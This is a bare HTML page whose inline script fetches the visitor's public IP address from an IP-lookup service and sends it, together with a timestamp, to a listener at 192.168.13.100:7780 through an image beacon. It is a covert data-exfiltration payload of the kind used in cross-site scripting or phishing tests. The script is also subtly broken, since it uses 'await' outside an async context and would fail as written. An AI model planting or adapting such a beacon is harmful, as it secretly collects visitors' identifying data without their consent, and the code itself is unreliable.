<html>
    <body>
        <SCRIPT>
            var i = new Image(); 
            var d = [];
            d.push(new Date());
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                d.push(data.ip);
            } catch (error) {
                console.error('Error fetching IP address:', error);
            }
            i.src="http://192.168.13.100:7780?c="+d
        </SCRIPT>
    </body>
</html>
